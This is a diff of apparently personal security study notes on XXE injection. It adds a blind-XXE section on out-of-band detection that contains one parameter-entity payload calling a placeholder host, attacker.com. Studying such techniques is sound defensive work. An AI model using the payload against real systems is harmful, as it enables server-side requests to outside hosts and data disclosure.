@@ -1,11 +1,11 @@
-# XXE (XML external entity)
+# XXE
 
 ### What is XML
 
 * Some applications use the XML format to transmit data between the browser and the server.
 * Its popularity has now declined in favor of the JSON format
 
-## Impact
+**XXE Impact**
 
 * Retrieve files
 * Perform SSRF attacks
@@ -39,7 +39,12 @@
 
 ## Blind XXE
 
-* to do
+### Out-of-band (OAST) techniques <a href="#detecting-blind-xxe-using-out-of-band-oast-techniques" id="detecting-blind-xxe-using-out-of-band-oast-techniques"></a>
+
+* Detecting as SSRF
+* Bypass via XML parameter entities
+  * `<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://attacker.com"> %xxe; ]>`
+  * This XXE payload declares an XML parameter entity called `xxe` and then uses the entity within the DTD
 
 ## Finding hidden attack surface for XXE injection
 
